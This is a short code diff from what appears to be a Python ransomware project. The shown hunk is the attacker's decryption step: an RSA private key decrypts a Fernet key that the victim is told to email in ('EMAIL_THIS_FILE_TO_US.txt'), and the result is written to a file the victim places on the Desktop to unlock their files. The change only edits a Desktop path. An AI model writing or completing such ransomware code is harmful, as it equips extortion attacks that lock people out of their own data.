@@ -34,7 +34,7 @@ KxQYwO7qgcEIQllAIIKZSvchkLrVvgLx8UqS3SkncMSljdYRH2CXYl4F/eDs
 # Decrypting the fernet key
 def decrypting_fernet_key():
     private_key = rsa.PrivateKey.load_pkcs1(private_key_pem.encode())
-    with open(f'{systemRoot}/OneDrive/Desktop/EMAIL_THIS_FILE_TO_US.txt', 'rb') as f:
+    with open(f'{systemRoot}/Desktop/EMAIL_THIS_FILE_TO_US.txt', 'rb') as f:
         encrypted_data = f.read()
     decrypted_data = rsa.decrypt(encrypted_data, private_key)
     with open('PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt', 'wb') as f:
